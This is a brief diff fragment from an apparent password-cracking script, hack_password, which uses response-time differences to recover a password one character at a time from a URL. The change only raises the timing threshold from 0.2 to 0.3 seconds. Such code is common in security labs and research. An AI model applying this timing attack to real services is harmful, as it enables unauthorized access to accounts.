@@ -153,7 +153,7 @@ def hack_password(url, pool, max_length, padding_length):
                 cur_letter_time = t
                 continue
                 
-            if wrong_time - t > 0.2:
+            if wrong_time - t > 0.3:
                 print('=============================')
                 print(f'CHAR FOUND: {ch} | AT POS {i}')
                 password.append(ch)
